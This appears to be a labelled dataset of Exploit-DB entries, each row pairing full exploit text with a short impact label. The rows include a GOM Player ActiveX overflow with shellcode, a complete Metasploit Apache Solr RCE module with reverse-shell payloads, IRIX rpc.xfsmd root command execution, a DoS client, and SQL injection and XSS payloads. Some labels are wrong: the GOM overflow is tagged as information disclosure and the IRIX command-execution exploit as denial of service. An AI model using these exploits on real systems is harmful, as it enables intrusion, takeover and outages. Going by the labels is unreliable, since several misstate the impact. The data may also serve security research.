24594,QNX Photon phlocale - '-s' Overflow source: https://www.securityfocus.com/bid/11164/info   Reportedly QNX Photon MicroGUI is affected by multiple buffer overflow vulnerabilities in MicroGUI utilities. These issues are due to a failure of the affected applications to validate user-supplied string lengths before copying them into finite process buffers.   An attacker may leverage these issues to execute arbitrary code on the affected system within the context of the vulnerable applications; the applications are typically setuid applications.   $ /usr/photon/bin/phlocale -s AAAAA[...],execute arbitrary code on the affected system within the context of the vulnerable applications; the applications are typically setuid applications,1
26429,"Novell ZENworks Patch Management 6.0.52 - '/computers/default.asp?Direction' SQL Injection source: https://www.securityfocus.com/bid/15220/info  ZENworks Patch Management is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  It should be noted these vulnerabilities can only be exploited if a non-privileged account has been created. Only an administrator can create such an account.  http://www.example.com/computers/default.asp?sort=&Direction=';",exploit vulnerabilities in the underlying database implementation,1
4579,"GOM Player 2.1.6.3499 - 'GomWeb3.dll 1.0.0.12' Remote Overflow <!-- GOM Player 2.1.6.3499 GomWeb Control (GomWeb3.dll 1.0.0.12) remote buffer overflow poc exploit (ie6/xp sp2)  quote from Wikipedia: ""GOM Player(Gretech Online Movie Player) is South Korea's most popular media player; as of July 2007, it had 8.4 million users, compared to 5.4 million of Microsoft's Windows Media Player. Users most commonly use the player to watch pornography..."" mphhh ...  passing more than 506 ""A"" to OpenUrl method:  EAX 00000000 ECX 7C80240F kernel32.7C80240F EDX 7C91EB94 ntdll.KiFastSystemCallRet EBX 00000000 ESP 0012CDD0 ASCII ""AAAAAAAAAAAAAAAAAA... EBP 0012DE08 ESI 003390B0 EDI 0000102A EIP 41414141  object safety report: RegKey Safe for Script: True RegKey Safe for Init: True Implements IObjectSafety: True IDisp Safe:  Safe for untrusted: caller,data IPersist Safe:  Safe for untrusted: caller,data IPStorage Safe:  Safe for untrusted: caller,data  software site: http://www.gomplayer.com/main.html  rgod site: http://retrogod.altervista.org --> <html> <object classid='clsid:DC07C721-79E0-4BD4-A89F-C90871946A31' id='GomManager' /></object> <script language='vbscript'> //open calc.exe scode =      unescape(""%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49"") & _              unescape(""%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36"") & _              unescape(""%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34"") & _              unescape(""%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41"") & _              unescape(""%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54"") & _              unescape(""%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37"") & _              unescape(""%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48"") & _              unescape(""%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38"") & _              unescape(""%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c"") & _              unescape(""%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e"") & _              unescape(""%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48"") & _              unescape(""%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54"") & _              unescape(""%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38"") & _              unescape(""%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43"") & _              unescape(""%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37"") & _              unescape(""%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a"") & _              unescape(""%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b"") & _              unescape(""%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33"") & _              unescape(""%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57"") & _              unescape(""%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49"") & _              unescape(""%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36"") & _              unescape(""%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a"") eip = unescape(""%67%31%41%7e"") 'jmp esp kernel32.dll nop = String(48, unescape(""%90"")) sURL=String(506, ""A"") + eip + nop + scode GomManager.OpenURL sURL </script> </html>  # milw0rm.com [2007-10-29]",information disclosure,1
30849,"Joomla! Component com_search 1.5 RC3 - 'index.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/26707/info   Joomla! is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.   Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   Joomla! 1.5 RC3 is vulnerable; other versions may also be affected.   UPDATE (December 10, 2007): The validity of the issues is being disputed on the Joomla! Bug Tracker. Please see the references for details. Reports indicate that the related message was posted by a Joomla! developer, but this has not been confirmed.   http://www.example.com/index.php?searchword=&task=somechars%27+%2B+%27search&option=com_search http://www.example.com/index.php?searchword=&task=search&option=somechars%27+%2B+%27com_search","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
27358,"DVGuestbook 1.0/1.2.2 - 'index.php?page' Cross-Site Scripting source: https://www.securityfocus.com/bid/16968/info  DVGuestbook is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/path/index.php?page=""><script>alert(document.cookie)</script>",have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site,1
39188,"XOOPS Glossaire Module - '/modules/glossaire/glossaire-aff.php' SQL Injection source: https://www.securityfocus.com/bid/67460/info  Glossaire module for XOOPS is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  An attacker can leverage this issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Glossaire 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/modules/glossaire/glossaire-aff.php?lettre=A[SQL INJECTION]","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
48338,"Apache Solr - Remote Code Execution via Velocity Template (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core/exploit/powershell'  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::CmdStager   include Msf::Exploit::Powershell   include Msf::Exploit::Remote::HttpClient    def initialize(info = {})     super(       update_info(         info,         'Name'           => 'Apache Solr Remote Code Execution via Velocity Template',         'Description'    => %q(           This module exploits a vulnerability in Apache Solr <= 8.3.0 which allows remote code execution via a custom           Velocity template. Currently, this module only supports Solr basic authentication.            From the Tenable advisory:           An attacker could target a vulnerable Apache Solr instance by first identifying a list           of Solr core names. Once the core names have been identified, an attacker can send a specially crafted           HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response           Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity           template parameter in a specially crafted Solr request, leading to RCE.         ),         'License'        => MSF_LICENSE,         'Author'         =>           [             's00py', # Discovery and PoC             'jas502n', # exploit code on Github             'AleWong', # ExploitDB contribution, and exploit code on Github             'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module           ],         'References'     =>             [               [ 'EDB', '47572' ],               [ 'CVE', '2019-17558' ],               [ 'URL', 'https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability'],               [ 'URL', 'https://www.huaweicloud.com/en-us/notice/2018/20191104170849387.html'],               [ 'URL', 'https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133/'],               [ 'URL', 'https://github.com/jas502n/solr_rce'],               [ 'URL', 'https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template'],             ],         'Platform'       => ['linux', 'unix', 'win'],         'Targets'        =>             [               [                 'Unix (in-memory)',                 {                   'Platform'       => 'unix',                   'Arch'           => ARCH_CMD,                   'Type'           => :unix_memory,                   'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }                 }               ],               [                 'Linux (dropper)',                 {                   'Platform'        => 'linux',                   'Arch'            => [ARCH_X86, ARCH_X64],                   'Type'            => :linux_dropper,                   'DefaultOptions'  => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },                   'CmdStagerFlavor' => %w[curl wget]                 }               ],               [                 'x86/x64 Windows PowerShell',                 {                   'Platform'        => 'win',                   'Arch'            => [ARCH_X86, ARCH_X64],                   'Type'            => :windows_psh,                   'DefaultOptions'  => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }                 }               ],               [                 'x86/x64 Windows CmdStager',                 {                   'Platform'        => 'win',                   'Arch'            => [ARCH_X86, ARCH_X64],                   'Type'            => :windows_cmdstager,                   'DefaultOptions'  => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp', 'CmdStagerFlavor' => 'vbs' },                   'CmdStagerFlavor' => %w[vbs certutil]                 }               ],               [                 'Windows Exec',                 {                   'Platform'        => 'win',                   'Arch'            => ARCH_CMD,                   'Type'            => :windows_exec,                   'DefaultOptions'  => { 'PAYLOAD' => 'cmd/windows/generic' }                 }               ],             ],         'DisclosureDate' => ""2019-10-29"", # ISO-8601 formatted         'DefaultTarget'  => 0,         'Privileged'     => false       )     )      register_options(       [         Opt::RPORT(8983),         OptString.new('USERNAME', [false, 'Solr username', 'solr']),         OptString.new('PASSWORD', [false, 'Solr password', 'SolrRocks']),         OptString.new('TARGETURI', [false, 'Path to Solr', '/solr/'])       ]     )   end    # if we are going to exploit, we only need one core to be exploitable   @vuln_core = """"   # OS specific stuff   @target_platform = """"   # if authentication is used   @auth_string = """"    def check_auth     # see if authentication is required for the specified Solr instance     auth_check = solr_get('uri' => normalize_uri(target_uri.path))      # successfully connected?     unless auth_check       print_bad(""Connection failed!"")       return nil     end      # if response code is not 200, then the Solr instance definitely requires authentication     unless auth_check.code == 200       # if authentication is required and creds are not provided, we cannot reliably check exploitability       if datastore['USERNAME'] == """" && datastore['PASSWORD'] == """"         print_bad(""Credentials not provided, skipping credentialed check..."")         return nil       end        # otherwise, try the given creds       auth_string = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])       attempt_auth = solr_get('uri' => normalize_uri(target_uri.path), 'auth' => auth_string)        # successfully connected?       unless attempt_auth         print_bad(""Connection failed!"")         return nil       end       # if the return code is not 200, then authentication definitely failed       unless attempt_auth.code == 200         print_bad(""Invalid credentials!"")         return nil       end        store_valid_credential(         user: datastore['USERNAME'],         private: datastore['PASSWORD'],         private_type: :password,         proof: attempt_auth.to_s       )        @auth_string = auth_string     end     # a placeholder return value. Not requiring auth should throw no errors     """"   end    # check for vulnerability existence   def check     auth_res = check_auth     unless auth_res       return CheckCode::Unknown(""Authentication failed!"")     end      # send a GET request to get Solr and system details     ver = solr_get('uri' => normalize_uri(target_uri.path, '/admin/info/system'), 'auth' => @auth_string)      # can't connect? that's an automatic failure     unless ver       return CheckCode::Unknown(""Connection failed!"")     end      # convert to JSON     ver_json = ver.get_json_document     # get Solr version     solr_version = Gem::Version.new(ver_json['lucene']['solr-spec-version'])     print_status(""Found Apache Solr #{solr_version}"")     # get OS version details     @target_platform = ver_json['system']['name']     target_arch = ver_json['system']['arch']     target_osver = ver_json['system']['version']     print_status(""OS version is #{@target_platform} #{target_arch} #{target_osver}"")     # uname doesn't show up for Windows, so run a check for that     if ver_json['system']['uname']       # print uname only when verbose       vprint_status(""Full uname is '#{ver_json['system']['uname'].strip}'"")     end      # the vulnerability is only present in Solr versions <= 8.3.0     unless solr_version <= Gem::Version.new('8.3.0')       return CheckCode::Safe(""Running version of Solr is not vulnerable!"")     end      # enumerate cores     cores = solr_get('uri' => normalize_uri(target_uri.path, '/admin/cores'), 'auth' => @auth_string)      # can't connect? that's yet another automatic failure     unless cores       return CheckCode::Unknown(""Could not enumerate cores!"")     end      # convert to JSON yet again     cores_json = cores.get_json_document     # draw up an array of all the cores     cores_list = Array.new     # get the core names     cores_json['status'].keys.each do |core_name|       cores_list.push(core_name)     end      # no cores? that means nothing to exploit.     if cores_list.empty?       return CheckCode::Safe(""No cores found, nothing to exploit!"")     end      # got cores? tell the operator which cores were found     print_status(""Found core(s): #{cores_list.join(', ')}"")     possibly_vulnerable_cores = {}      cores_list.each do |core|       # for each core, attempt to get config       core_config = solr_get('uri' => normalize_uri(target_uri.path, core.to_s, 'config'), 'auth' => @auth_string)        # can't retrieve configuration for that core? go next       unless core_config         print_error(""Could not retrieve configuration for core #{core}!"")         next       end        # convert to JSON       core_config_json = core_config.get_json_document       # if the core configuration does not include the Velocity Response Writer, it isn't vulnerable       if core_config_json['config']['queryResponseWriter'].keys.include?(""velocity"")         vprint_good(""Found Velocity Response Writer in use by core #{core}"")         if core_config_json['config']['queryResponseWriter']['velocity']['params.resource.loader.enabled'] == ""true""           vprint_good(""params.resource.loader.enabled for core '#{core}' is set to true."")           possibly_vulnerable_cores.store(core, true)         else           # if params.resource.loader.enabled is false, we need to set it to true before exploitation           print_warning(""params.resource.loader.enabled for core #{core} is set to false."")           possibly_vulnerable_cores.store(core, false)         end       else         vprint_error(""Velocity Response Writer not found in core #{core}"")         next       end     end      # look at the array of possibly vulnerable cores     if possibly_vulnerable_cores.empty?       CheckCode::Safe(""No cores are vulnerable!"")     else       # if possible, pick a core that already has params.resource.loader.enabled set to true       possibly_vulnerable_cores.each do |core|         if core[1] == true           @vuln_core = core           break         end       end       # otherwise, just pick the first one       if @vuln_core.to_s == """"         @vuln_core = possibly_vulnerable_cores.first       end       CheckCode::Vulnerable     end   end    # the exploit method   def exploit     unless [CheckCode::Vulnerable].include? check       fail_with Failure::NotVulnerable, ""Target is most likely not vulnerable!""     end      print_status(""Targeting core '#{@vuln_core[0]}'"")      # if params.resource.loader.enabled for that core is false     if @vuln_core[1] != true       # the new config in JSON format       enable_params_resource_loader = {         ""update-queryresponsewriter"": {           ""startup"": ""lazy"",           ""name"": ""velocity"",           ""class"": ""solr.VelocityResponseWriter"",           ""template.base.dir"": """",           ""solr.resource.loader.enabled"": ""true"",           ""params.resource.loader.enabled"": ""true""         }       }.to_json        opts_post = {         'method'        => 'POST',         'connection'    => 'Keep-Alive',         'ctype'         => 'application/json;charset=utf-8',         'encode_params' => false,         'uri'           => normalize_uri(target_uri.path, @vuln_core[0].to_s, 'config'),         'data'          => enable_params_resource_loader       }        unless @auth_string == """"         opts_post.store('authorization', @auth_string)       end        print_status(""params.resource.loader.enabled is false, setting it to true..."")       update_config = send_request_cgi(opts_post)        unless update_config         fail_with Failure::Unreachable, ""Connection failed!""       end        # if we got anything other than a 200 back, the configuration update failed and the exploit won't work       unless update_config.code == 200         fail_with Failure::UnexpectedReply, ""Unable to update config, exploit failed!""       end        print_good(""params.resource.loader.enabled is now set to true!"")     end      # windows...     if @target_platform.include? ""Windows""       # if target is wrong, warn and exit before doing anything       unless target.name.include? ""Windows""         fail_with Failure::NoTarget, ""Target is found to be Windows, please select the proper target!""       end        case target['Type']       # PowerShell...       when :windows_psh         # need PowerShell for this         winenv_path = execute_command(""C:\\Windows\\System32\\cmd.exe /c PATH"", 'auth_string' => @auth_string, 'core_name' => @vuln_core[0], 'winenv_check' => true)         unless winenv_path           fail_with Failure::Unreachable, ""Connection failed!""         end          # did the command to check for PATH execute?         unless winenv_path.code == 200           fail_with Failure::UnexpectedReply, ""Unexpected reply from target, aborting!""         end          # is PowerShell in PATH?         if /powershell/i =~ winenv_path.body.to_s           # only interested in the contents of PATH. Everything before it is irrelevant           paths = winenv_path.body.split('=')[1]           # confirm that PowerShell exists in the PATH by checking each one           paths.split(';').each do |path_val|             # if PowerShell exists in PATH, then we are good to go             unless /powershell/i =~ path_val               next             end              print_good(""Found Powershell at #{path_val}"")             # generate PowerShell command, encode with base64, and remove comspec             psh_cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)             # specify full path to PowerShell             psh_cmd.insert(0, path_val)             # exploit the thing             execute_command(psh_cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])             break           end         else           fail_with Failure::BadConfig, ""PowerShell not found!""         end       # ... CmdStager ...       when :windows_cmdstager         print_status(""Sending CmdStager payload..."")         execute_cmdstager(linemax: 7130, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])       # ... or plain old exec?       when :windows_exec         cmd = ""C:\\Windows\\System32\\cmd.exe /c #{payload.encoded}""         execute_command(cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])       end     end      # ... or nix-based?     if @target_platform.include? ""Linux""       # if target is wrong, warn and exit before doing anything       if target.name.include? ""Windows""         fail_with Failure::NoTarget, ""Target is found to be nix-based, please select the proper target!""       end        case target['Type']       when :linux_dropper         execute_cmdstager('auth_string' => @auth_string, 'core_name' => @vuln_core[0])       when :unix_memory         cmd = ""/bin/bash -c $@|/bin/bash . echo #{payload.encoded}""         execute_command(cmd, 'auth_string' => @auth_string, 'core_name' => @vuln_core[0])       end     end   end    # some prep work has to be done to work around the limitations of Java's Runtime.exec()   def execute_cmdstager_begin(_opts)     if @target_platform.include? ""Windows""       @cmd_list.each do |command|         command.insert(0, ""C:\\Windows\\System32\\cmd.exe /c "")       end     else       @cmd_list.each do |command|         command.insert(0, ""/bin/bash -c $@|/bin/bash . echo "")       end     end   end    # sic 'em, bois!   def execute_command(cmd, opts = {})     # custom template which enables command execution     template = <<~VELOCITY       #set($x="""")       #set($rt=$x.class.forName(""java.lang.Runtime""))       #set($chr=$x.class.forName(""java.lang.Character""))       #set($str=$x.class.forName(""java.lang.String""))     VELOCITY      # attempts to solve the quoting problem, partially successful     if target.name.include?(""Unix"")       template += <<~VELOCITY         #set($ex=$rt.getRuntime().exec(""#{cmd}""))       VELOCITY     else       template += <<~VELOCITY         #set($ex=$rt.getRuntime().exec('#{cmd}'))       VELOCITY     end      template += <<~VELOCITY       $ex.waitFor()     VELOCITY      # the next 2 lines cause problems with CmdStager, so it's only used when needed     # during the check for PowerShell existence, or by specific payloads     if opts['winenv_check'] || target['Type'] == :windows_exec || target['Type'] == :unix_memory       template += <<~VELOCITY         #set($out=$ex.getInputStream())         #if($out.available())         #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end         #else         #end       VELOCITY     end      # execute the exploit...     raw_result = solr_get(       'uri' => normalize_uri(target_uri.path, opts['core_name'].to_s, 'select'),       'auth' => opts['auth_string'],       'vars_get' =>  {         'q'                 => '1',         'wt'                => 'velocity',         'v.template'        => 'custom',         'v.template.custom' => template       }     )      # Executing PATH always gives a result, so it can return safely     if opts['winenv_check']       return raw_result     end      # for printing command output     unless raw_result.nil?       unless raw_result.code == 200         fail_with Failure::PayloadFailed, ""Payload failed to execute!""       end        # to get pretty output       result_inter = raw_result.body.to_s.sub(""0\n"", "":::"").split("":::"").last       unless result_inter.nil?         final_result = result_inter.split(""\n"").first.strip         print_good(final_result)       end     end   end    # make sending requests easier   def solr_get(opts = {})     send_request_cgi_opts = {       'method'        => 'GET',       'connection'    => 'Keep-Alive',       'uri'           => opts['uri']     }      # @auth_string defaults to """" if no authentication is necessary     # otherwise, authentication is required     if opts['auth'] != """"       send_request_cgi_opts.store('authorization', opts['auth'])     end      # a bit unrefined, but should suffice in this case     if opts['vars_get']       send_request_cgi_opts.store('vars_get', opts['vars_get'])     end      send_request_cgi(send_request_cgi_opts)   end end",code execution,1
1093,"PrivaShare 1.3 - Denial of Service /*     PrivaShare TCP/IP DoS Exploit ----------------------------------------  Resolve host... [OK]  [+] Connecting... [OK] Target locked Sending bad procedure... [OK]  [+] Server DoS'ed   Tested on Windows2000 SP4  Greats: Infam0us Gr0up Team/member,and ll of u..take care!   Info:  - infamous.2hell.com  - basher13@linuxmail.org  */  #include <string.h> #include <winsock2.h> #include <stdio.h>  #pragma comment(lib, ""ws2_32.lib"")  char doscore[] = /*          Offset 0000ca10 to 0000ca2b  0000ca10 6c 00 69 00 73 00 74 00 4f 00 66 00 43 00 6f 00 6e 00 74 00 61 00 63 00 74 00 73 00  HEX: 6c 20 69 20 73 20 74 20 4f 20 66 20 43 20 6f 20 6e 20 74 20 61 20 63 20 74   */ ""listOfContacts,null"" ""***          PrivaShare TCP/IP DoS Exploit        \n"" ""***-----------------------------------------------\n"" ""***   Infam0us Gr0up - Securiti Research Team     \n\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"" ""***DOS ATTACK! DOS ATTACK! DOS ATTACK! DOS ATTACK!\n"";    int main(int argc, char *argv[]) { WSADATA wsaData; WORD wVersionRequested; struct hostent *pTarget; struct sockaddr_in sock; char *target; int port,bufsize; SOCKET inetdos;  if (argc < 2) { printf(""        PrivaShare TCP/IP DoS Exploit \n"", argv[0]); printf(""  ------------------------------------------\n"", argv[0]); printf(""      Infam0us Gr0up - Securiti Research\n\n"", argv[0]); printf(""[-]Usage: %s [target] [port]\n"", argv[0]); printf(""[?]Exam: %s localhost 2001\n"", argv[0]); exit(1); }  wVersionRequested = MAKEWORD(1, 1); if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;  target = argv[1]; port = 2001;  if (argc >= 3) port = atoi(argv[2]); bufsize = 1024; if (argc >= 4) bufsize = atoi(argv[3]);  inetdos = socket(AF_INET, SOCK_STREAM, 0); if(inetdos==INVALID_SOCKET) { printf(""Socket ERROR \n""); exit(1); } printf(""        PrivaShare TCP/IP DoS Exploit \n"", argv[0]); printf(""  ------------------------------------------\r\n\n"", argv[0]); printf(""Resolve host... ""); if ((pTarget = gethostbyname(target)) == NULL) { printf(""FAILED \n"", argv[0]); exit(1); } printf(""[OK]\n ""); memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length); sock.sin_family = AF_INET; sock.sin_port = htons((USHORT)port);  printf(""[+] Connecting... ""); if ( (connect(inetdos, (struct sockaddr *)&sock, sizeof (sock) ))) { printf(""FAILED\n""); exit(1); } printf(""[OK]\n""); printf(""Target locked\n""); printf(""Sending bad procedure... ""); if (send(inetdos, doscore, sizeof(doscore)-1, 0) == -1) { printf(""ERROR\n""); closesocket(inetdos); exit(1); } printf(""[OK]\n ""); printf(""[+] Server DoS'ed\n""); closesocket(inetdos); WSACleanup(); return 0; }  // milw0rm.com [2005-07-07]",DoS,1
15696,"Alice 2.2 - Arbitrary Code Execution -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  Title: Alice 2.2 Arbitrary Code Execution Exploit Date: Dec 5, 2010 Author: Rew Email: rew [splat] leethax.info Link: http://alice.org/index.php Version: 2.2 (Windows) Tested on: WinXP CVE: NA (0day)  This was a fun one to exploit.  Let me explain...  Alice saves programs (worlds) in a custom "".a2w"" format.  This is essentially just a zip file containing some XML and images.  A little poking around reveals a python script called ""script.py"" in there too. I've never seen Alice put code in it, so I'm not sure what it's real purpose is, but it gets executed every time the program starts.  (Ok seriously, whose smart idea was that!?)  When I discovered this, I figured, ""Cool, a simple os.system() should do the trick."", but there's a problem;  Alice relies on Jython (http://jython.org/) to interpret the Python code, but the Jython Devs seem to have made a mistake in their code.  In jython-1.2\Lib\javaos.py, line 23 runs...  from __future__ import division  I guess this is supposed to fix some python bug, however in our case it results in all OS shell commands dying with a syntax error.  :/  Yes, there are others (popen2, commands, etc), but in Jython they all ultimately call the os library.  I thought for a while about what could be done using only built-in python function, but all I could come up with was arbitrary file reads/writes.  This could still lead to code execution (easier on linux because you can write to the startup shell script), but it's not as clean.  Then it hit me.  Why not just use the file functions to fix the developers mistake, and then call os.system()?  And what do you know, it worked!!  Here's how  1. Use Python to open up jython-2.1\Lib\javaos.py 2. Comment out line 23 and write it back to the file 3. Call os.system(), thus h4cking th3 pl4n3t 4. Repair our modifications so we remain undetected :)  Quite funny I think.  We have to fix the developers mistake to exploit the program.  Attached is a PoC that will run calc.exe.  It may be a little unreliable if there are any file permission issues or the directory has somehow changed.  If that happens, tweak it and it will work.  Enjoy, Rew  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.11 (GNU/Linux) Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/  iEYEARECAAYFAkz8WUQACgkQy2WYMxSouUziYQCfcDlB5rWT541euew8pZW2BA03 FhUAn0y6pBrAJXLcLiEfINR5hT4MfL52 =zMAG -----END PGP SIGNATURE-----  Exploit: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15696.a2w (Off_with_her_head.a2w)",Arbitrary Code Execution,1
21571,"SGI IRIX 6.x - 'rpc.xfsmd' Remote Command Execution // source: https://www.securityfocus.com/bid/5075/info  Throghout the implementation of the supported remote procedure calls, the server uses the popen() libc function. When popen() is used, arguments passed to the RPC are included in the command string. These arguments are not sanitized. If shell metacharacters, such as "";"" and ""|"" are embedded in the remotely supplied arguments, additional commands may be executed. These commands will run with root privileges.  /*## copyright LAST STAGE OF DELIRIUM Sep 1999 poland        *://lsd-pl.net/ #*/ /*## xfsmd                                                                   #*/  /*   this code forces xfsmd to execute any command on remote IRIX host or     */ /*   to export any file system from it with read/write privileges.            */ /*   the exploit requires that DNS is properly configured on an attacked      */ /*   host. additionally, if the file systems are to be exported from a        */ /*   vulnerable system, it must have NFS subsystem running.                   */  /*   example usage:                                                           */ /*   xfsmd address -c ""touch /etc/lsd""                                        */ /*     (executes ""touch /etc/lsd"" command as root user on a vulnerable host)  */ /*   xfsmd address -e 10.0.0.1 -d ""/""                                         */ /*     (exports / filesystem to the 10.0.0.1 host with rw privileges)         */   #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <rpc/rpc.h> #include <netdb.h> #include <stdio.h> #include <errno.h>  #define XFS_PROG    391016 #define XFS_VERS    1      #define XFS_EXPORT  13  typedef char *req_t; typedef struct{char *str1;int errno;}res_t;  bool_t xdr_req(XDR *xdrs,req_t *objp){     if(!xdr_string(xdrs,objp,~0)) return(FALSE);     return(TRUE); }  bool_t xdr_res(XDR *xdrs,res_t *objp){     if(!xdr_string(xdrs,&objp->str1,~0)) return(FALSE);     if(!xdr_int(xdrs,&objp->errno)) return(FALSE);     return(TRUE); }  main(int argc,char **argv){     char command[10000],*h,*cmd,*hst=NULL,*dir=""/etc"";     int i,port=0,flag=0,c;     CLIENT *cl;enum clnt_stat stat;     struct hostent *hp;     struct sockaddr_in adr;     struct timeval tm={10,0};     req_t req;     res_t res;      printf(""copyright LAST STAGE OF DELIRIUM Sep 1999 poland  //lsd-pl.net/\n"");     printf(""rpc.xfsmd for irix 6.2 6.3 6.4 6.5 6.5.16 IP:all\n\n"");      if(argc<3){         printf(""usage: %s address -c \""command\"" [-p port]\n"",argv[0]);         printf(""       %s address -e address [-d dir] [-p port]\n"",argv[0]);         exit(-1);     }     while((c=getopt(argc-1,&argv[1],""c:p:e:d:""))!=-1){ 	 switch(c){ 	 case 'c': flag=0;cmd=optarg;break;          case 'e': flag=1;hst=optarg;break;          case 'd': dir=optarg;break;          case 'p': port=atoi(optarg); 	 }     }      req=command;     if(!flag){         printf(""executing %s command... "",cmd);         sprintf(req,""XFS_MNT_DIR:/tmp\nroot:;%s;"",cmd);     }else{         printf(""exporting %s directory to %s... "",dir,hst);         sprintf(req,""XFS_FS_NAME:%s\nroot:%s\n"",dir,hst);     }      adr.sin_family=AF_INET;     adr.sin_port=htons(port);     if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){         if((hp=gethostbyname(argv[1]))==NULL){             errno=EADDRNOTAVAIL;perror(""error"");exit(-1);         }         memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);     }else{         if((hp=gethostbyaddr((char*)&adr.sin_addr.s_addr,4,AF_INET))==NULL){             errno=EADDRNOTAVAIL;perror(""error"");exit(-1);         }     }     if((h=(char*)strchr(hp->h_name,'.'))!=NULL) *(h+1)=0;     else strcat(hp->h_name,""."");      i=RPC_ANYSOCK;     if(!(cl=clnttcp_create(&adr,XFS_PROG,XFS_VERS,&i,0,0))){         clnt_pcreateerror(""error"");exit(-1);     }      cl->cl_auth=authunix_create(hp->h_name,0,0,0,NULL);     stat=clnt_call(cl,XFS_EXPORT,xdr_req,(void*)&req,xdr_res,(void*)&res,tm);     if(stat!=RPC_SUCCESS) {clnt_perror(cl,""error"");exit(-1);}     printf(""%s\n"",(!flag)?""ok"":((!res.errno)?""ok"":""failed"")); }",denial of service,1
